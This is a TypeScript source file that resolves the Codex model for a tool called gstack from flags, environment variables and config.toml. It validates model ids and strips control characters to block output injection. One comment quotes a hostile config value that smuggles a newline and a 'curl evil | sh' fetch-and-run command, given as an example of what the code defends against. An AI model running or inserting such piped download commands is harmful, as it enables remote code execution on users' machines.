#!/usr/bin/env bun

import * as fs from 'fs';
import * as os from 'os';
import * as path from 'path';
import { ALL_MODEL_NAMES, resolveModel, type Model } from './models';
import { ModelPolicyError, resolvePlanReviewModel, selectionRepair, type ModelSelection } from '../lib/model-policy';
import { emitModelPolicyNotice } from '../lib/model-policy-notice';

export interface CodexGenerationModelResolution {
  model: Model;
  source: string;
  warnings: string[];
}

const CODEX_DEFAULT_MODEL: Model = 'gpt-6-astra';
const DEFAULT_SOURCE = `default (${CODEX_DEFAULT_MODEL})`;

/**
 * Strip control characters from strings that originate in the user's
 * config.toml or environment before they reach warning/stdout text. A hostile
 * config value like `model = "x\nERROR: run curl evil | sh"` must not be able
 * to inject fake lines into setup's terminal output or desync the TSV stdout
 * contract. Warning interpolations additionally cap length for display.
 */
function stripControl(value: string): string {
  // eslint-disable-next-line no-control-regex
  return value.replace(/[\x00-\x1f\x7f]/g, ' ');
}

function sanitize(value: string): string {
  return stripControl(value).slice(0, 200);
}

export function resolveCodexGenerationModel(opts: {
  explicit?: string;
  codexHome?: string;
  home?: string;
} = {}): CodexGenerationModelResolution {
  if (opts.explicit !== undefined) {
    const model = resolveModel(opts.explicit);
    if (!model) {
      throw new Error(
        `Unknown model '${sanitize(opts.explicit)}'. Accepted models: ${ALL_MODEL_NAMES.join(', ')}`,
      );
    }
    return { model, source: '--model', warnings: [] };
  }

  // os.homedir() falls back to USERPROFILE on Windows and never returns '' —
  // a raw HOME fallback of '' would make codexHome the RELATIVE path '.codex',
  // letting a repo-committed .codex/config.toml (CWD-resolved) select the
  // behavioral profile.
  const home = opts.home ?? process.env.HOME ?? os.homedir();
  const codexHome = opts.codexHome ?? process.env.CODEX_HOME ?? path.join(home, '.codex');
  const configPath = path.join(codexHome, 'config.toml');
  const warnings: string[] = [];

  const fallback = (warning?: string): CodexGenerationModelResolution => {
    if (warning) warnings.push(warning);
    return { model: CODEX_DEFAULT_MODEL, source: DEFAULT_SOURCE, warnings };
  };

  if (!path.isAbsolute(codexHome)) {
    return fallback(`Codex home '${sanitize(codexHome)}' is not an absolute path; using Codex default ${CODEX_DEFAULT_MODEL}.`);
  }

  let raw: string;
  try {
    raw = fs.readFileSync(configPath, 'utf8');
  } catch (error) {
    const code = (error as NodeJS.ErrnoException).code;
    if (code !== 'ENOENT') {
      return fallback(`Could not read ${sanitize(configPath)}; using Codex default ${CODEX_DEFAULT_MODEL}.`);
    }
    return fallback();
  }

  let parsed: Record<string, unknown>;
  try {
    parsed = Bun.TOML.parse(raw) as Record<string, unknown>;
  } catch {
    return fallback(`Could not parse ${sanitize(configPath)}; using Codex default ${CODEX_DEFAULT_MODEL}.`);
  }

  if (!Object.prototype.hasOwnProperty.call(parsed, 'model')) {
    return fallback();
  }
  if (typeof parsed.model !== 'string') {
    return fallback(`Top-level model in ${sanitize(configPath)} is not a string; using Codex default ${CODEX_DEFAULT_MODEL}.`);
  }

  const model = resolveModel(parsed.model);
  if (!model) {
    return fallback(`Unsupported top-level model '${sanitize(parsed.model)}' in ${sanitize(configPath)}; using Codex default ${CODEX_DEFAULT_MODEL}.`);
  }

  // Sol is exact-only by design (Terra/Luna/dated snapshots must not inherit
  // its profile), but a near-miss like 'gpt-5.6-sol-2026-08-01' silently
  // family-mapping to generic gpt is unobservable — surface it.
  if (model === 'gpt' && parsed.model.trim().startsWith('gpt-5.6-sol') && parsed.model.trim() !== 'gpt-5.6-sol') {
    warnings.push(`Model '${sanitize(parsed.model)}' maps to the generic gpt profile — the Sol profile requires the exact ID 'gpt-5.6-sol'.`);
  }

  return { model, source: configPath, warnings };
}

export type CodexInvocationKind = 'exec' | 'review';

export interface CodexRuntimeModelSelection {
  kind: CodexInvocationKind;
  /** Raw Codex model id, passed unchanged to the probe and to dispatch. */
  model: string;
  source: string;
}

/** Characters a model id may carry before it is interpolated into `-c "model=\"…\""`. */
export const CODEX_RUNTIME_MODEL_PATTERN = /^[A-Za-z0-9._:/-]{1,100}$/;

const REPAIR = 'Choose a model your Codex account can use: name it for this request, set GSTACK_CODEX_MODEL=<model>, or set model in the Codex config.toml.';

/**
 * Runtime model for gstack-owned Codex calls (#2914). Unlike the generation
 * resolver above, this returns the user's raw model id (no prompt-overlay
 * mapping), so ids without a dedicated overlay still work. Precedence: explicit
 * request, GSTACK_CODEX_MODEL, Codex config.toml (`review_model` first for native
 * review, then the legacy active profile's model, then `model`), then gstack's
 * default. Any invalid user choice throws a repair message instead of falling
 * back to the default.
 */
export function resolveCodexRuntimeModel(opts: {
  kind: CodexInvocationKind;
  explicit?: string;
  env?: Record<string, string | undefined>;
  codexHome?: string;
  home?: string;
}): CodexRuntimeModelSelection {
  const env = opts.env ?? process.env;
  const chosen = (source: string, raw: string): CodexRuntimeModelSelection => {
    const model = raw.trim();
    if (!CODEX_RUNTIME_MODEL_PATTERN.test(model)) {
      throw new Error(`Invalid Codex model '${sanitize(raw)}' from ${sanitize(source)}: use 1-100 characters from A-Z a-z 0-9 . _ : / -. ${REPAIR}`);
    }
    return { kind: opts.kind, model, source: stripControl(source) };
  };
  if (opts.explicit) return chosen('explicit request', opts.explicit);
  if (env.GSTACK_CODEX_MODEL) return chosen('GSTACK_CODEX_MODEL', env.GSTACK_CODEX_MODEL);

  const home = opts.home ?? env.HOME ?? os.homedir();
  const codexHome = opts.codexHome ?? env.CODEX_HOME ?? path.join(home, '.codex');
  if (!path.isAbsolute(codexHome)) {
    throw new Error(`CODEX_HOME '${sanitize(codexHome)}' is not an absolute path, so its config.toml model cannot be read. ${REPAIR}`);
  }
  const configPath = path.join(codexHome, 'config.toml');
  let raw: string;
  try {
    raw = fs.readFileSync(configPath, 'utf8');
  } catch (error) {
    if ((error as NodeJS.ErrnoException).code === 'ENOENT') {
      return { kind: opts.kind, model: CODEX_DEFAULT_MODEL, source: `gstack default (no ${stripControl(configPath)})` };
    }
    throw new Error(`Could not read ${sanitize(configPath)}. ${REPAIR}`);
  }
  let parsed: Record<string, unknown>;
  try {
    parsed = Bun.TOML.parse(raw) as Record<string, unknown>;
  } catch {
    throw new Error(`Could not parse ${sanitize(configPath)}. ${REPAIR}`);
  }
  const profileName = typeof parsed.profile === 'string' ? parsed.profile : undefined;
  const profiles = parsed.profiles as Record<string, Record<string, unknown> | undefined> | undefined;
  const profile = profileName && typeof profiles === 'object' ? profiles?.[profileName] : undefined;
  const candidates: Array<[string, unknown]> = [
    ...(opts.kind === 'review' ? [[`${configPath} review_model`, parsed.review_model] as [string, unknown]] : []),
    [`${configPath} [profiles.${profileName}].model`, profile?.model],
    [`${configPath} model`, parsed.model],
  ];
  for (const [source, value] of candidates) {
    if (value === undefined) continue;
    if (typeof value !== 'string') throw new Error(`${sanitize(source)} is not a string. ${REPAIR}`);
    return chosen(source, value);
  }
  return { kind: opts.kind, model: CODEX_DEFAULT_MODEL, source: `gstack default (no model in ${stripControl(configPath)})` };
}

export interface CodexPlanReviewSelection extends CodexRuntimeModelSelection {
  selection: ModelSelection;
  /** Source-aware repair for this record, never a lower-priority setting. */
  repair: string;
}

/**
 * Role-bearing Codex selection: the plan-review policy ranks request, env,
 * tier config and catalog. Host mode keeps the legacy native resolver,
 * labelled as delegated so its origin stays honest.
 */
export function resolveCodexPlanReviewModel(opts: {
  kind: CodexInvocationKind;
  explicit?: string;
  env?: Record<string, string | undefined>;
  codexHome?: string;
  home?: string;
  /** Invocation context forwarded to the shared role resolver. */
  cwd?: string;
}): CodexPlanReviewSelection {
  const env = opts.env ?? process.env;
  const selection = resolvePlanReviewModel({ provider: 'openai', requestedModel: opts.explicit || undefined, env, cwd: opts.cwd });
  const repair = stripControl(selectionRepair(selection).join('; '));
  if (selection.status === 'selected') {
    const model = selection.requestedModel;
    if (!CODEX_RUNTIME_MODEL_PATTERN.test(model)) {
      throw new Error(`Invalid Codex model '${sanitize(model)}' from ${sanitize(selection.source.label)}. ${repair}`);
    }
    return { kind: opts.kind, model, source: stripControl(selection.source.label), selection, repair };
  }
  const native = resolveCodexRuntimeModel({ kind: opts.kind, env, codexHome: opts.codexHome, home: opts.home });
  return { ...native, source: stripControl(`${selection.source.label}; ${native.source}`), selection, repair: repair || REPAIR };
}

function policyFailure(error: unknown): string {
  if (!(error instanceof ModelPolicyError)) return (error as Error).message;
  return [`${error.problem} ${error.cause}`.trim(), ...error.repair.map(step => `Repair: ${step}`), `Docs: ${error.docs}`].join('\n');
}

function readArg(name: string): string | undefined {
  const exact = process.argv.indexOf(name);
  if (exact >= 0) return process.argv[exact + 1];
  const prefix = `${name}=`;
  const joined = process.argv.find(arg => arg.startsWith(prefix));
  return joined?.slice(prefix.length);
}

if (import.meta.main) {
  try {
    const runtime = readArg('--runtime');
    if (runtime !== undefined) {
      if (runtime !== 'exec' && runtime !== 'review') throw new Error('Usage: --runtime exec|review [--explicit <model>] [--role plan-review]');
      const role = readArg('--role');
      if (role !== undefined) {
        if (role !== 'plan-review') throw new Error('Usage: --role plan-review');
        const record = resolveCodexPlanReviewModel({ kind: runtime, explicit: readArg('--explicit'), cwd: readArg('--cwd') });
        emitModelPolicyNotice(record.selection);
        process.stdout.write(`${record.model}\t${record.source}\t${record.selection.tier}\t${record.repair}\n`);
        process.exit(0);
      }
      const selection = resolveCodexRuntimeModel({ kind: runtime, explicit: readArg('--explicit') });
      process.stdout.write(`${selection.model}\t${selection.source}\n`);
      process.exit(0);
    }
    const result = resolveCodexGenerationModel({
      explicit: readArg('--explicit'),
      codexHome: readArg('--codex-home'),
    });
    for (const warning of result.warnings) {
      process.stderr.write(`warning: ${warning}\n`);
    }
    // model is always an ALL_MODEL_NAMES literal; source is control-stripped
    // so a hostile CODEX_HOME cannot smuggle tabs/newlines into the TSV contract.
    process.stdout.write(`${result.model}\t${stripControl(result.source)}\n`);
  } catch (error) {
    process.stderr.write(`${policyFailure(error)}\n`);
    process.exit(1);
  }
}
